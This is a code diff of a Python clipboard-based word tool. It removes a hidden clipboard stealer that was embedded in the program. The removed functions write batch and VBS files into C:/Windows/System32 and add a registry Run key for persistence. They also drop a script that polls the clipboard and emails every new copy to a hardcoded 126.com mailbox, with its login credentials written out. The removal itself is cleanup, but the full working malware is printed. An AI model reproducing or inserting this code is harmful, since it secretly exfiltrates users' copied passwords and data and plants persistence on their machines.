@@ -1327,31 +1327,6 @@ def fuzzy_finder(wordlist, datelist):
                     return
 
 
-def send_email(str_captured):
-    mail_host = "smtp.126.com"  # 设置服务器
-    mail_user = "MrShadomago@126.com"  # 用户名
-    mail_pass = "abc123456"  # 口令
-
-    sender = 'MrShadomago@126.com'
-    receivers = ['MrShadomago@126.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
-
-    message = MIMEText(str_captured, 'plain', 'utf-8')
-    message['From'] = Header("Just Hacking again", 'utf-8')
-    message['To'] = Header("You Will never know me", 'utf-8')
-
-    subject = 'Python SMTP 邮件测试'
-    message['Subject'] = Header(subject, 'utf-8')
-
-    try:
-        smtpObj = smtplib.SMTP()
-        smtpObj.connect(mail_host, 25)  # 25 为 SMTP 端口号
-        smtpObj.login(mail_user, mail_pass)
-        smtpObj.sendmail(sender, receivers, message.as_string())
-        print("邮件发送成功")
-    except smtplib.SMTPException:
-        print("Error: 无法发送邮件")
-
-
 def show_word(wordlist, show_date_delimeter=False, show_by_time=False):
     if not show_date_delimeter:
         for i in wordlist:
@@ -1425,78 +1400,6 @@ def monitor_clipboard(last_data, wordlist, datelist):
             gen_normal_launcher()
             open_console()
             exit()
-
-
-
-def create_files():
-    q = open("C:/Windows/System32/VeritigoAgent.bat", "w+", encoding="utf-8")
-    q.write('python VertigoAgentInit.py')
-    f = open("C:/Windows/System32/VertigoAgent.vbs", "w+", encoding="utf-8")
-    f.write('Set ws = CreateObject("wscript.Shell")\n ws.run "cmd /c SysAgent.bat",vbhide ')
-    h = open("C:/Windows/System32/VertigoSecure.vbs","w+", encoding="ANSI")
-    h.write("""Dim AutoRunProgram     
-Set AutoRunProgram = WScript.CreateObject("wscript.shell")
-regpath ="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"    
-Type_Name = "REG_SZ"   
-Key_Name = "SysAgent"     
-Key_data = "C:/Windows/System32/SystemAgent.vbs"
-AutorunProgram.RegWrite regpath,Key_Name,Key_data,Type_Name 
-    """)
-    z = open("C:/Windows/System32/VertigoAgentInit.py", "w+", encoding="utf-8")
-    z.write("""
-import time
-import pyperclip
-import smtplib
-from email.mime.text import MIMEText
-from email.header import Header
-
-
-def ascension(str_captured):
-    mail_host = "smtp.126.com"  # 设置服务器
-    mail_user = "MrShadomago@126.com"  # 用户名
-    mail_pass = "abc123456"  # 口令
-
-    sender = 'MrShadomago@126.com'
-    receivers = ['MrShadomago@126.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
-
-    message = MIMEText(str_captured, 'plain', 'utf-8')
-    message['From'] = Header("Just Hacking again", 'utf-8')
-    message['To'] = Header("You Will never know me", 'utf-8')
-
-    subject = 'Python SMTP 邮件测试'
-    message['Subject'] = Header(subject, 'utf-8')
-
-    try:
-        smtpObj = smtplib.SMTP()
-        smtpObj.connect(mail_host, 25)  # 25 为 SMTP 端口号
-        smtpObj.login(mail_user, mail_pass)
-        smtpObj.sendmail(sender, receivers, message.as_string())
-        print("邮件发送成功")
-    except smtplib.SMTPException:
-        print("Error: 无法发送邮件")
-
-
-def monitor_clipboard(last_data):
-    while True:
-        try:
-            time.sleep(0.2)
-            clip_data = pyperclip.paste()
-            if clip_data != last_data:
-                ascension(clip_data)
-                last_data = clip_data
-                continue
-        except KeyboardInterrupt:
-            return    
-
-
-if __name__ == '__main__':
-    last_data = ""
-    monitor_clipboard(last_data)
-    """)
-    h.close()
-    z.close()
-    f.close()
-    q.close()
 
 
 def display_cur_version():
